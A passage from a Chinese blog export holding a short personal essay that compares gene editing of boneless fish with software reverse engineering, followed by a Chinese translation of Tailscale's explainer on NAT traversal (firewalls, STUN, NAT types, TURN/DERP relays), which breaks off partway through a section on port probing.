[{"content":" 时间：2022/01/22 晚\n“无刺鱼基因工程”引发的思考 今日下班时看到这个“无刺鱼”的新闻，对此事件产生一些思考，仅以此文记载自己的这些思考。\n一、基因工程与逆向工程 “科研团队成功找到了控制鱼刺生长的主效基因”，当自己读到这句话时，突然有了一种似曾相识的感觉，回忆片刻，这不就自己在看到一个新的代码项目时，研究其运行机理时的场景吗？当自己拿到一个新的项目时，看了部分代码然后就对项目的代码改一改，然后再运行，看它会出现什么效果。根据效果来推测自己改动的地方在整个项目中扮演着怎样的角色。通过这样不断地尝试最终明白整个项目不同代码的功能。\n又仔细想了想，感觉基因工程和做代码逆向更为接近一点。做代码逆向时我们拿到的就是一个编译后的二进制的文件，我们需要对这堆二进制进行反推其代码逻辑。这个过程中我们也会像做基因工程一样不断尝试不断找到规律，从而剖析整个代码逻辑。现在做逆向工程会比最开始做逆向工程的人们简单很多，因为现在有了现成的工具能够直接将二进制代码反编译为汇编代码，甚至能反编译为高级语言。其实现的原理就是人们通过大量的数据已经发现了二进制代码与汇编代码以及高级代码之间的规律，将这种规律加持到工具中就能轻易的通过二进制代码推断出汇编以及高级语言代码的样子。\n综上所述，当基因工程的科研人员找到了基因与性状之间的关系后，基因工程工作者同样能够制作这样的工具，将基因代码直接翻译为性状。相信到那个时候基因工程将会变得容易许多吧。\n二、世界是不是制定好的？ 阐述了基因工程和逆向工程之间的关系，那么下一步思考就是：生命体是否像二进制程序一样“人”编译出来的“程序”？\n例如当人们看到一片杂草丛生的草地，人们会觉得这是自然生长出来的，因为这是无序的；但是当看到一块平整的草地，我们的第一想法就是这是人工修剪出来的，因为它太有序了。\n那我们身处的世界，宇宙间那么多的事物，竟然都有着许多相同的规律，那么是不是意味着我们的宇宙实际上也是“人”修剪出来的一块“草坪”呢？\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E6%97%A0%E5%88%BA%E9%B1%BC%E5%9F%BA%E5%9B%A0%E5%B7%A5%E7%A8%8B%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/","title":"“无刺鱼基因工程”引发的思考"},{"content":" \u003c!DOCTYPE html\u003e [译] NAT 穿透是如何工作的：技术原理及企业级实践（Tailscale, 2020） ArthurChiao's Blog Menu Home Articles (EN) Articles (中文) Categories About Donate [译] NAT 穿透是如何工作的：技术原理及企业级实践（Tailscale, 2020） Published at 2021-10-21 | Last Update 2021-10-21\n译者序 本文翻译自 2020 年的一篇英文博客： How NAT traversal works。\n设想这样一个问题：在北京和上海各有一台局域网的机器（例如一台是家里的台式机，一 台是连接到星巴克 WiFi 的笔记本），二者都是私网 IP 地址，但可以访问公网， 如何让这两台机器通信呢？\n既然二者都能访问公网，那最简单的方式当然是在公网上架设一个中继服务器： 两台机器分别连接到中继服务，后者完成双向转发。这种方式显然有很大的性能开销，而 且中继服务器很容易成为瓶颈。\n有没有办法不用中继，让两台机器直接通信呢？\n如果有一定的网络和协议基础，就会明白这事儿是可能的。Tailscale 的这篇史诗级长文由浅入深地展示了这种“可能”，如果完全实现本文所 介绍的技术，你将得到一个企业级的 NAT/防火墙穿透工具。 此外，如作者所说，去中心化软件领域中的许多有趣想法，简化之后其实都变成了 跨过公网（互联网）实现端到端直连 这一问题，因此本文的意义并不仅限于 NAT 穿透本身。\n由于译者水平有限，本文不免存在遗漏或错误之处。如有疑问，请查阅原文。\n以下是译文。\n译者序 1 引言 1.1 背景：IPv4 地址短缺，引入 NAT 1.2 需求：两台经过 NAT 的机器建立点对点连接 1.3 方案：NAT 穿透 1.3.1 两个必备前提：UDP + 能直接控制 socket 1.3.2 保底方式：中继 1.4 挑战：有状态防火墙和 NAT 设备 2 穿透防火墙 2.1 有状态防火墙 2.1.1 默认行为（策略） 2.1.2 如何区分入向和出向包 2.2 防火墙朝向（face-off）与穿透方案 2.2.1 防火墙朝向相同 场景特点：服务端 IP 可直接访问 穿透方案：客户端直连服务端，或 hub-and-spoke 拓扑 2.2.2 防火墙朝向不同 场景特点：服务端 IP 不可直接访问 穿透方案：两边同时主动建连，在本地防火墙为对方打开一个洞 2.3 关于穿透防火墙的一些思考 2.3.1 双向主动建连：旁路信道 2.3.2 非活跃连接被防火墙清理 2.3.3 问题都解决了？不，挑战刚刚开始 3 NAT 的本质 3.1 NAT 设备与有状态防火墙 3.2 NAT 穿透与 SNAT/DNAT 3.3 SNAT 的意义：解决 IPv4 地址短缺问题 3.4 SNAT 过程：以家用路由器为例 3.5 SNAT 给穿透带来的挑战 4 穿透 “NAT+防火墙”：STUN (Session Traversal Utilities for NAT) 协议 4.1 STUN 原理 4.2 为什么 NAT 穿透逻辑和主协议要共享同一个 socket 4.3 STUN 的问题：不能穿透所有 NAT 设备（例如企业级 NAT 网关） 4.4 重新审视 STUN 的前提 5 中场补课：NAT 正式术语 5.1 早期术语 5.2 近期研究与新术语 5.3 老的 cone 类型划分 5.4 针对 NAT 穿透场景：简化 NAT 分类 5.5 更多 NAT 规范（RFC） 6 穿透 NAT+防火墙：STUN 不可用时，fallback 到中继模式 6.1 问题回顾与保底方式（中继） 6.2 中继协议：TURN、DERP 6.3 小结 7 穿透 NAT+防火墙：企业级改进 7.1 穿透 hard NAT：暴力端口扫描 7.2 基于生日悖论改进暴力扫描：hard side 多开端口 + easy side 随机探测 7.3 双 hard NAT 场景 7.4 控制端口映射（port mapping）过程：UPnP/NAT-PMP/PCP 协议 7.5 多 NAT 协商（Negotiating numerous NATs） 7.6 运营商级 NAT 带来的问题 新挑战：同一 CGNAT 侧直连，STUN 不可用 解决方案：如果端口映射协议能用：一端做端口映射 解决方案：如果端口映射协议不能用：NAT hairpin 模式 7.7 全 IPv6 网络：理想之地，但并非问题全无 全球 IPv4/IPv6 部署现状 新场景：NAT64/DNS64 解决方案：CLAT (Customer-side transLATor) 解决方案：CLAT 不存在时，手动穿透 NAT64 设备 7.8 将所有解决方式集成到 ICE 协议 针对具体场景，该选择哪种穿透方式？ ICE (Interactive Connectivity Establishment) 算法 健壮性与降级 7.9 安全 8 结束语 8.1 跨公网 端到端直连 8.2 结束语之 TL; DR 在前一篇文章 How Tailscale Works 中， 我们已经用较长篇幅介绍了 Tailscale 是如何工作的。但其中并没有详细描述我们是 如何穿透 NAT 设备，从而实现终端设备直连的 —— 不管这些终端之间 有什么设备（防火墙、NAT 等），以及有多少设备。本文试图补足这一内容。\n1 引言 1.1 背景：IPv4 地址短缺，引入 NAT 全球 IPv4 地址早已不够用，因此人们发明了 NAT（网络地址转换）来缓解这个问题。\n简单来说，大部分机器都使用私有 IP 地址，如果它们需要访问公网服务，那么，\n出向流量：需要经过一台 NAT 设备，它会对流量进行 SNAT，将私有 srcIP+Port 转 换成 NAT 设备的公网 IP+Port（这样应答包才能回来），然后再将包发出去； 应答流量（入向）：到达 NAT 设备后进行相反的转换，然后再转发给客户端。 整个过程对双方透明。\n更多关于 NAT 的内容，可参考 (译) NAT - 网络地址转换（2016）。 译注。\n以上是本文所讨论问题的基本背景。\n1.2 需求：两台经过 NAT 的机器建立点对点连接 在以上所描述的 NAT 背景下，我们从最简单的问题开始：如何在两台经过 NAT 的机器之间建立 点对点连接（直连）。如下图所示：\n直接用机器的 IP 互连显然是不行的，因为它们都是私有 IP（例如 192.168.1.x）。 在 Tailscale 中，我们会建立一个 WireGuard® 隧道 来解决这个问题 —— 但这并不是太重要，因为我们将过去几代人努力都整合到了一个工具集， 这些技术广泛适用于各种场景。例如，\nWebRTC 使用这些技术在浏览器之间完成 peer-to-peer 语音、视频和数据传输， VoIP 电话和一些视频游戏也使用类似机制，虽然不是所有情况下都很成功。 接下来，本文将在一般意义上讨论这些技术，并在合适的地方拿 Tailscale 和其他一些东西作为例子。\n1.3 方案：NAT 穿透 1.3.1 两个必备前提：UDP + 能直接控制 socket 如果想设计自己的协议来实现 NAT 穿透，那必须满足以下两个条件：\n协议应该基于 UDP。\n理论上用 TCP 也能实现，但它会给本已相当复杂的问题再增加一层复杂性， 甚至还需要定制化内核 —— 取决于你想实现到什么程度。本文接下来都将关注在 UDP 上。\n如果考虑 TCP 是想在 NAT 穿透时获得面向流的连接（ stream-oriented connection），可以考虑用 QUIC 来替代，它构 建在 UDP 之上，因此我们能将关注点放在 UDP NAT 穿透，而仍然能获得一个 很好的流协议（stream protocol）。\n对收发包的 socket 有直接控制权。\n例如，从经验上来说，无法基于某个现有的网络库实现 NAT 穿透，因为我们 必须在使用的“主要”协议之外，发送和接收额外的数据包。\n某些协议（例如 WebRTC）将 NAT 穿透与其他部分紧密集成。但如果你在构建自己的协议， 建议将 NAT 穿透作为一个独立实体，与主协议并行运行，二者仅 仅是共享 socket 的关系，如下图所示，这将带来很大帮助：\n1.3.2 保底方式：中继 在某些场景中，直接访问 socket 这一条件可能很难满足。\n退而求其次的一个方式是设置一个 local proxy（本地代理），主协议与这个 proxy 通信 ，后者来完成 NAT 穿透，将包中继（relay）给对端。这种方式增加了一个额外的间接层 ，但好处是：\n仍然能获得 NAT 穿透， 不需要对已有的应用程序做任何改动。 1.4 挑战：有状态防火墙和 NAT 设备 有了以上铺垫，下面就从最基本的原则开始，一步步看如何实现一个企业级的 NAT 穿透方案。\n我们的目标是：在两个设备之间通过 UDP 实现双向通信， 有了这个基础，上层的其他协议（WireGuard, QUIC, WebRTC 等）就能做一些更酷的事情。\n但即便这个看似最基本的功能，在实现上也要解决两个障碍：\n有状态防火墙 NAT 设备 2 穿透防火墙 有状态防火墙是以上两个问题中相对比较容易解决的。实际上，大部分 NAT 设备都自带了一个有状态防火墙， 因此要解决第二个问题，必须先解决有第一个问题。\n有状态防火墙具体有很多种类型，有些你可能见过：\nWindows Defender firewall Ubuntu’s ufw (using iptables/nftables) BSD/macOS pf AWS Security Groups（安全组） 2.1 有状态防火墙 2.1.1 默认行为（策略） 以上防火墙的配置都是很灵活的，但大部分配置默认都是如下行为：\n允许所有出向连接（allows all “outbound” connections） 禁止所有入向连接（blocks all “inbound” connections） 可能有少量例外规则，例如 allowing inbound SSH。\n2.1.2 如何区分入向和出向包 连接（connection）和方向（direction）都是协议设计者头脑中的概念，到了 物理传输层，每个连接都是双向的；允许所有的包双向传输。 那防火墙是如何区分哪些是入向包、哪些是出向包的呢？ 这就要回到“有状态”（stateful）这三个字了：有状态防火墙会记录它 看到的每个包，当收到下一个包时，会利用这些信息（状态）来判断应该做什么。\n对 UDP 来说，规则很简单：如果防火墙之前看到过一个出向包（outbound），就会允许 相应的入向包（inbound）通过，以下图为例：\n笔记本电脑中自带了一个防火墙，当该防火墙看到从这台机器出去的 2.2.2.2:1234 -\u0026gt; 5.5.5.5:5678 包时，就会记录一下：5.5.5.5:5678 -\u0026gt; 2.2.2.2:1234 入向包应该放行。 这里的逻辑是：我们信任的世界（即笔记本）想主动与 5.5.5.5:5678 通信，因此应该放行（allow）其回包路径。\n某些非常宽松的防火墙只要看到有从 2.2.2.2:1234 出去的包，就 会允许所有从外部进入 2.2.2.2:1234 的流量。这种防火墙对我们的 NAT 穿透来说非 常友好，但已经越来越少见了。\n2.2 防火墙朝向（face-off）与穿透方案 2.2.1 防火墙朝向相同 场景特点：服务端 IP 可直接访问 在 NAT 穿透场景中，以上默认规则对 UDP 流量的影响不大 —— 只要路径上所有防火墙的“朝向”是一样的。 一般来说，从内网访问公网上的某个服务器都属于这种情况。\n我们唯一的要求是：连接必须是由防火墙后面的机器发起的。这是因为 在它主动和别人通信之前，没人能主动和它通信，如下图所示：\n穿透方案：客户端直连服务端，或 hub-and-spoke 拓扑 但上图是假设了通信双方中，其中一端（服务端）是能直接访问到的。 在 VPN 场景中，这就形成了所谓的 hub-and-spoke 拓扑：中心的 hub 没有任何防火墙策略，谁都能访问到； 防火墙后面的 spokes 连接到 hub。如下图所示：\n2.2.2 防火墙朝向不同 场景特点：服务端 IP 不可直接访问 但如果两个“客户端”想直连，以上方式就不行了，此时两边的防火墙相向而立，如下图所示：\n根据前面的讨论，这种情况意味着：两边要同时发起连接请求，但也意味着 两边都无法发起有效请求，因为对方先发起请求才能在它的防火墙上打开一条缝让我们进去！ 如何破解这个问题呢？一种方式是让用户重新配置一边或两边的防火墙，打开一个端口， 允许对方的流量进来。\n这显然对用户不友好，在像 Tailscale 这样的 mesh 网络中的扩展性也不好，在 mesh 网络中，我们假设对端会以一定的粒度在公网上移动。 此外，在很多情况下用户也没有防火墙的控制权限：例如在咖啡馆或机场中，连接的路 由器是不受你控制的（否则你可能就有麻烦了）。 因此，我们需要寻找一种不用重新配置防火墙的方式。\n穿透方案：两边同时主动建连，在本地防火墙为对方打开一个洞 解决的思路还是先重新审视前面提到的有状态防火墙规则：\n对于 UDP，其规则（逻辑）是：包必须先出去才能进来（packets must flow out before packets can flow back in）。 注意，这里除了要满足包的 IP 和端口要匹配这一条件之外，并没有要求包必须是相关的（related）。 换句话说，只要某些包带着正确的源和目的地址出去了，任何看起来像是响应的包都会被防火墙放进来 —— 即使对端根本没收到你发出去的包。 因此，要穿透这些有状态防火墙，我们只需要共享一些信息：让两端提前知道对方使用的 ip:port：\n手动静态配置是一种方式，但显然扩展性不好； 我们开发了一个 coordination server， 以灵活、安全的方式来同步 ip:port 信息。 有了对方的 ip:port 信息之后，两端开始给对方发送 UDP 包。在这个过程中，我们预 料到某些包将会被丢弃。因此，双方必须要接受某些包会丢失的事实， 因此如果是重要信息，你必须自己准备好重传。对 UDP 来说丢包是可接受的，但这里尤其需要接受。\n来看一下具体建连（穿透）过程：\n如图所示，笔记本出去的第一包，2.2.2.2:1234 -\u0026gt; 7.7.7.7:5678，穿过 Windows Defender 防火墙进入到公网。\n对方的防火墙会将这个包拦截掉，因为它没有 7.7.7.7:5678 -\u0026gt; 2.2.2.2:1234 的流量记录。 但另一方面，Windows Defender 此时已经记录了出向连接，因此会允许 7.7.7.7:5678 -\u0026gt; 2.2.2.2:1234 的应答包进来。\n接着，第一个 7.7.7.7:5678 -\u0026gt; 2.2.2.2:1234 穿过它自己的防火墙到达公网。\n到达客户端侧时，Windows Defender 认为这是刚才出向包的应答包，因此就放行它进入了！ 此外，右侧的防火墙此时也记录了：2.2.2.2:1234 -\u0026gt; 7.7.7.7:5678 的包应该放行。\n笔记本收到服务器发来的包之后，发送一个包作为应答。这个包穿过 Windows Defender 防火墙 和服务端防火墙（因为这是对服务端发送的包的应答包），达到服务端。\n成功！这样我们就建立了一个穿透两个相向防火墙的双向通信连接。 而初看之下，这项任务似乎是不可能完成的。\n2.3 关于穿透防火墙的一些思考 穿透防火墙并非永远这么轻松，有时会受一些第三方系统的间接影响，需要仔细处理。 那穿透防火墙需要注意什么呢？重要的一点是：通信双方必须几乎同时发起通信， 这样才能在路径上的防火墙打开一条缝，而且两端还都是活着的。\n2.3.1 双向主动建连：旁路信道 如何实现“同时”呢？一种方式是两端不断重试，但显然这种方式很浪费资源。假如双方都 知道何时开始建连就好了。\n这听上去是鸡生蛋蛋生鸡的问题了：双方想要通信，必须先提前通个信。 但实际上，我们可以通过旁路信道（side channel）来达到这个目的 ，并且这个旁路信道并不需要很 fancy：它可以有几秒钟的延迟、只需要传送几 KB 的 信息，因此即使是一个配置非常低的虚拟机，也能为几千台机器提供这样的旁路通信服务。\n在遥远的过去，我曾用 XMPP 聊天消息作为旁路，效果非常不错。 另一个例子是 WebRTC，它需要你提供一个自己的“信令信道”（signalling channel， 这个词也暗示了 WebRTC 的 IP telephony ancestry），并将其配置到 WebRTC API。 在 Tailscale，我们的协调服务器（coordination server）和 DERP (Detour Encrypted Routing Protocol) 服务器集群是我们的旁路信道。 2.3.2 非活跃连接被防火墙清理 有状态防火墙内存通常比较有限，因此会定期清理不活跃的连接（UDP 常见的是 30s）， 因此要保持连接 alive 的话需要定期通信，否则就会被防火墙关闭，为避免这个问题， 我们，\n要么定期向对方发包来 keepalive， 要么有某种带外方式来按需重建连接。 2.3.3 问题都解决了？不，挑战刚刚开始 对于防火墙穿透来说， 我们并不需要关心路径上有几堵墙 —— 只要它们是有状态防火墙且允许出 向连接，这种同时发包（simultaneous transmission）机制就能穿透任意多层防火墙。 这一点对我们来说非常友好，因为只需要实现一个逻辑，然后能适用于任何地方了。\n…对吗？\n其实，不完全对。这个机制有效的前提是：我们能提前知道对方的 ip:port。 而这就涉及到了我们今天的主题：NAT，它会使前面我们刚获得的一点满足感顿时消失。\n下面，进入本文正题。\n3 NAT 的本质 3.1 NAT 设备与有状态防火墙 可以认为 NAT 设备是一个增强版的有状态防火墙，虽然它的增强功能 对于本文场景来说并不受欢迎：除了前面提到的有状态拦截/放行功能之外，它们还会在数据包经过时修改这些包。\n3.2 NAT 穿透与 SNAT/DNAT 具体来说，NAT 设备能完成某种类型的网络地址转换，例如，替换源或目的 IP 地址或端口。\n讨论连接问题和 NAT 穿透问题时，我们只会受 source NAT —— SNAT 的影响。 DNAT 不会影响 NAT 穿透。 3.3 SNAT 的意义：解决 IPv4 地址短缺问题 SNAT 最常见的使用场景是将很多设备连接到公网，而只使用少数几个公网 IP。 例如对于消费级路由器，会将所有设备的（私有） IP 地址映射为单个连接到公网的 IP 地址。\n这种方式存在的意义是：我们有远多于可用公网 IP 数量的设备需要连接到公网，（至少 对 IPv4 来说如此，IPv6 的情况后面会讨论）。NAT 使多个设备能共享同一 IP 地址，因 此即使面临 IPv4 地址短缺的问题，我们仍然能不断扩张互联网的规模。\n3.4 SNAT 过程：以家用路由器为例 假设你的笔记本连接到家里的 WiFi，下面看一下它连接到公网某个服务器时的情形：\n笔记本发送 UDP packet 192.168.0.20:1234 -\u0026gt; 7.7.7.7:5678。\n这一步就好像笔记本有一个公网 IP 一样，但源地址 192.168.0.20 是私有地址， 只能出现在私有网络，公网不认，收到这样的包时它不知道如何应答。\n家用路由器出场，执行 SNAT。\n包经过路由器时，路由器发现这是一个它没有见过的新会话（session）。 它知道 192.168.0.20 是私有 IP，公网无法给这样的地址回包，但它有办法解决：\n在它自己的公网 IP 上挑一个可用的 UDP 端口，例如 2.2.2.2:4242， 然后创建一个 NAT mapping：192.168.0.20:1234 \u0026lt;--\u0026gt; 2.2.2.2:4242， 然后将包发到公网，此时源地址变成了 2.2.2.2:4242 而不是原来的 192.168.0.20:1234。因此服务端看到的是转换之后地址， 接下来，每个能匹配到这条映射规则的包，都会被路由器改写 IP 和 端口。 反向路径是类似的，路由器会执行相反的地址转换，将 2.2.2.2:4242 变回 192.168.0.20:1234。对于笔记本来说，它根本感知不知道这正反两次变换过程。\n这里是拿家用路由器作为例子，但办公网的原理是一样的。不同之处在 于，办公网的 NAT 可能有多台设备组成（高可用、容量等目的），而且它们有不止一个公 网 IP 地址可用，因此在选择可用的公网 ip:port 来做映射时，选择空间更大，能支持 更多客户端。\n3.5 SNAT 给穿透带来的挑战 现在我们遇到了与前面有状态防火墙类似的情况，但这次是 NAT 设备：通信双方 不知道对方的 ip:port 是什么，因此无法主动建连，如下图所示：\n但这次比有状态防火墙更糟糕，严格来说，在双方发包之前，根本无法确定（自己及对方的）ip:port 信息，因为 只有出向包经过路由器之后才会产生 NAT mapping（即，可以被对方连接的 ip:port 信息）。\n因此我们又回到了与防火墙遇到的问题，并且情况更糟糕：双方都需要主动和对 方建连，但又不知道对方的公网地址是多少，只有当对方先说话之后，我们才能拿到它的地址信息。\n如何破解以上死锁呢？这就轮到 STUN 登场了。\n4 穿透 “NAT+防火墙”：STUN (Session Traversal Utilities for NAT) 协议 STUN 既是一些对 NAT 设备行为的详细研究，也是一种协助 NAT 穿透的协议。本文主要关注 STUN 协议。\n4.1 STUN 原理 STUN 基于一个简单的观察：从一个会被 NAT 的客户端访问公网服务器时， 服务器看到的是 NAT 设备的公网 ip:port 地址，而非该 客户端的局域网 ip:port 地址。\n也就是说，服务器能告诉客户端它看到的客户端的 ip:port 是什么。 因此，只要将这个信息以某种方式告诉通信对端（peer），后者就知道该和哪个地址建连了！ 这样就又简化为前面的防火墙穿透问题了。\n本质上这就是 STUN 协议的工作原理，如下图所示：\n笔记本向 STUN 服务器发送一个请求：“从你的角度看，我的地址什么？” STUN 服务器返回一个响应：“我看到你的 UDP 包是从这个地址来的：ip:port”。 The STUN protocol has a bunch more stuff in it — there’s a way of obfuscating the ip:port in the response to stop really broken NATs from mangling the packet’s payload, and a whole authentication mechanism that only really gets used by TURN and ICE, sibling protocols to STUN that we’ll talk about in a bit. We can ignore all of that stuff for address discovery.\n4.2 为什么 NAT 穿透逻辑和主协议要共享同一个 socket 理解了 STUN 原理，也就能理解为什么我们在文章开头说，如果 要实现自己的 NAT 穿透逻辑和主协议，就必须让二者共享同一个 socket：\n每个 socket 在 NAT 设备上都对应一个映射关系（私网地址 -\u0026gt; 公网地址）， STUN 服务器只是辅助穿透的基础设施， 与 STUN 服务器通信之后，在 NAT 及防火墙设备上打开了一个连接，允许入向包进来（回忆前面内容， 只要目的地址对，UDP 包就能进来，不管这些包是不是从 STUN 服务器来的）， 因此，接下来只要将这个地址告诉我们的通信对端（peer），让它往这个地址发包，就能实现穿透了。 4.3 STUN 的问题：不能穿透所有 NAT 设备（例如企业级 NAT 网关） 有了 STUN，我们的穿透目的似乎已经实现了：每台机器都通过 STUN 来获取自己的私网 socket 对应的公网 ip:port，然后把这个信息告诉对端，然后两端 同时发起穿透防火墙的尝试，后面的过程就和上一节介绍的防火墙穿透一样了，对吗？\n答案是：看情况。某些情况下确实如此，但有些情况下却不行。通常来说，\n对于大部分家用路由器场景，这种方式是没问题的； 但对于一些企业级 NAT 网关来说，这种方式无法奏效。 NAT 设备的说明书上越强调它的安全性，STUN 方式失败的可能性就越高。（但注意，从实际意义上来说， NAT 设备在任何方面都并不会增强网络的安全性，但这不是本文重点，因此不展开。）\n4.4 重新审视 STUN 的前提 再次审视前面关于 STUN 的假设：当 STUN 服务器告诉客户端在公网看来它的地址是 2.2.2.2:4242 时，那所有目的地址是 2.2.2.2:4242 的包就都能穿透防火墙到达该客户端。\n这也正是问题所在：这一点并不总是成立。\n某些 NAT 设备的行为与我们假设的一致，它们的有状态防火墙组件只要看到有客户端自己 发起的出向包，就会允许相应的入向包进入；因此只要利用 STUN 功能，再加上两端同时 发起防火墙穿透，就能把连接打通；\nin theory, there are also NAT devices that are super relaxed, and don’t ship with stateful firewall stuff at all. In those, you don’t even need simultaneous transmission, the STUN request gives you an internet ip:port that anyone can connect to with no further ceremony. If such devices do still exist, they’re increasingly rare.\n另外一些 NAT 设备就要困难很多了，它会针对每个目的地址来生成一条相应的映射关系。 在这样的设备上，如果我们用相同的 socket 来分别发送数据包到 5.5.5.5:1234 and 7.7.7.7:2345，我们就会得到 2.2.2.2 上的两个不同的端口，每个目的地址对应一个。 如果反向包的端口用的不对，包就无法通过防火墙。如下图所示：\n5 中场补课：NAT 正式术语 知道 NAT 设备的行为并不是完全一样之后，我们来引入一些正式术语。\n5.1 早期术语 如果之前接触过 NAT 穿透，可能会听说过下面这些名词：\n“Full Cone” “Restricted Cone” “Port-Restricted Cone” “Symmetric” NATs 这些都是 NAT 穿透领域的早期术语。\n但其实这些术语相当让人困惑。我每次都要 查一下 Restricted Cone NAT 是什么意思。从实际经验来看，我并不是唯一对此感到困惑的人。 例如，如今互联网上将 “easy” NAT 归类为 Full Cone，而实际上它们更应该归类为 Port-Restricted Cone。\n5.2 近期研究与新术语 最近的一些研究和 RFC 已经提出了一些更准确的术语。\n首先，它们明确了如下事实：NAT 设备的行为差异表现在多个维度， 而并非只有早期研究中所说的 “cone” 这一个维度，因此基于 “cone” 来划分类别并不是很有帮助。 其次，新研究和新术语能更准确地描述 NAT 在做什么。 前面提到的所谓 \"easy\" 和 \"hard\" NAT，只在一个维度有不同：NAT 映射是否考虑到目的地址信息。 RFC 4787 中，\n将 easy NAT 及其变种称为 “Endpoint-Independent Mapping” (EIM，终点无关的映射)\n但是，从“命名很难”这一程序员界的伟大传统来说，EIM 这个词其实 也并不是 100% 准确，因为这种 NAT 仍然依赖 endpoint，只不过依赖的是源 endpoint：每个 source ip:port 对应一个映射 —— 否则你的包就会和别人的包混在一起，导致混乱。\n严格来说，EIM 应该称为 “Destination Endpoint Independent Mapping” (DEIM?)， 但这个名字太拗口了，而且按照惯例，Endpoint 永远指的是 Destination Endpoint。\n将 hard NAT 以及变种称为 “Endpoint-Dependent Mapping”（EDM，终点相关的映射） 。\nEDM 中还有一个子类型，依据是只根据 dst_ip 做映射，还是根据 dst_ip + dst_port 做映射。 对于 NAT 穿透来说，这种区分对来说是一样的：它们都会导致 STUN 方式不可用。\n5.3 老的 cone 类型划分 你可能会有疑问：根据是否依赖 endpoint 这一条件，只能组合出两种可能，那为什么传 统分类中会有四种 cone 类型呢？答案是 cone 包含了两个正交维度的 NAT 行为：\nNAT 映射行为：前面已经介绍过了， 有状态防火墙行为：与前者类似，也是分为与 endpoint 相关还是无关两种类型。 因此最终组合如下：\nNAT Cone Types\nEndpoint 无关 NAT mapping Endpoint 相关 NAT mapping (all types) Endpoint 无关防火墙 Full Cone NAT N/A* Endpoint 相关防火墙 (dst. IP only) Restricted Cone NAT N/A* Endpoint 相关防火墙 (dst. IP+port) Port-Restricted Cone NAT Symmetric NAT 分解到这种程度之后就可以看出，cone 类型对 NAT 穿透场景来说并没有什么意义。 我们关心的只有一点：是否是 Symmetric —— 换句话说，一个 NAT 设备是 EIM 还是 EDM 类型的。\n5.4 针对 NAT 穿透场景：简化 NAT 分类 以上讨论可知，虽然理解防火墙的具体行为很重要，但对于编写 NAT 穿透代码来说，这一点并不重要。 我们的两端同时发包方式（simultaneous transmission trick）能 有效穿透以上三种类型的防火墙。在真实场景中， 我们主要在处理的是 IP-and-port endpoint-dependent 防火墙。\n因此，对于实际 NAT 穿透实现，我们可以将以上分类简化成：\nEndpoint-Independent NAT mapping Endpoint-Dependent NAT mapping (dst. IP only) Firewall is yes Easy NAT Hard NAT 5.5 更多 NAT 规范（RFC） 想了解更多新的 NAT 术语，可参考\nRFC 4787 (NAT Behavioral Requirements for UDP) RFC 5382 (for TCP) RFC 5508 (for ICMP) 如果自己实现 NAT，那应该（should）遵循这些 RFC 的规范，这样才能使你的 NAT 行为符合业界惯例，与其他厂商的设备或软件良好兼容。\n6 穿透 NAT+防火墙：STUN 不可用时，fallback 到中继模式 6.1 问题回顾与保底方式（中继） 补完基础知识（尤其是定义了什么是 hard NAT）之后，回到我们的 NAT 穿透主题。\n第 1~4 节已经解决了 STUN 和防火墙穿透的问题， 但 hard NAT 对我们来说是个大问题，只要路径上出现一个这种设备，前面的方案就行不通了。 准备放弃了吗？ 这才进入 NAT 真正有挑战的部分：如果已经试过了前面介绍的所有方式 仍然不能穿透，我们该怎么办呢？\n实际上，确实有很多 NAT 实现在这种情况下都会选择放弃，向用户报一个“无法连接”之类的错误。 但对我们来说，这么快就放弃显然是不可接受的 —— 解决不了连通性问题，Tailscale 就没有存在的意义。 我们的保底解决方式是：创建一个中继连接（relay）实现双方的无障碍地通信。 但是，中继方式性能不是很差吗？这要看具体情况：\n如果能直连，那显然没必要用中继方式； 但如果无法直连，而中继路径又非常接近双方直连的真实路径，并且带宽足够大，那中 继方式并不会明显降低通信质量。延迟肯定会增加一点，带宽会占用一些，但 相比完全连接不上，还是更能让用户接受的。 不过要注意：我们只有在无法直连时才会选择中继方式。实际场景中，\n对于大部分网络，我们都能通过前面介绍的方式实现直连， 剩下的长尾用中继方式来解决，并不算一个很糟的方式。 此外，某些网络会阻止 NAT 穿透，其影响比这种 hard NAT 大多了。例如，我们观察到 UC Berkeley guest WiFi 禁止除 DNS 流量之外的所有 outbound UDP 流量。 不管用什么 NAT 黑科技，都无法绕过这个拦截。因此我们终归还是需要一些可靠的 fallback 机制。\n6.2 中继协议：TURN、DERP 有多种中继实现方式。\nTURN (Traversal Using Relays around NAT)：经典方式，核心理念是\n用户（人）先去公网上的 TURN 服务器认证，成功后后者会告诉你：“我已经为你分配了 ip:port，接下来将为你中继流量”， 然后将这个 ip:port 地址告诉对方，让它去连接这个地址，接下去就是非常简单的客户端/服务器通信模型了。 Tailscale 并不使用 TURN。这种协议用起来并不是很好，而且与 STUN 不同， 它没有真正的交互性，因为互联网上并没有公开的 TURN 服务器。\nDERP (Detoured Encrypted Routing Protocol)\n这是我们创建的一个协议，DERP，\n它是一个通用目的包中继协议，运行在 HTTP 之上，而大部分网络都是允许 HTTP 通信的。 它根据目的公钥（destination’s public key）来中继加密的流量（encrypted payloads）。 前面也简单提到过，DERP 既是我们在 NAT 穿透失败时的保底通信方式（此时的角色 与 TURN 类似），也是在其他一些场景下帮助我们完成 NAT 穿透的旁路信道。 换句话说，它既是我们的保底方式，也是有更好的穿透链路时，帮助我们进行连接升 级（upgrade to a peer-to-peer connection）的基础设施。\n6.3 小结 有了“中继”这种保底方式之后，我们穿透的成功率大大增加了。 如果此时不再阅读本文接下来的内容，而是把上面介绍的穿透方式都实现了，我预计：\n90% 的情况下，你都能实现直连穿透； 剩下的 10% 里，用中继方式能穿透一些（some）； 这已经算是一个“足够好”的穿透实现了。\n7 穿透 NAT+防火墙：企业级改进 如果你并不满足于“足够好”，那我们可以做的事情还有很多！\n本节将介绍一些五花八门的 tricks，在某些特殊场景下会帮到我们。单独使用这项技术都 无法解决 NAT 穿透问题，但将它们巧妙地组合起来，我们能更加接近 100% 的穿透成功率。\n7.1 穿透 hard NAT：暴力端口扫描 回忆 hard NAT 中遇到的问题，如下图所示，关键问题是：easy NAT 不知道该往 hard NAT 方的哪个 ip:port 发包。\n但必须要往正确的 ip:port 发包，才能穿透防火墙，实现双向互通。 怎么办呢？\n首先，我们能知道 hard NAT 的一些 ip:port，因为我们有 STUN 服务器。\n这里先假设我们获得的这些 IP 地址都是正确的（这一点并不总是成立，但这里先这么假 设。而实际上，大部分情况下这一点都是成立的，如果对此有兴趣，可以参考 REQ-2 in RFC 4787）。\nIP 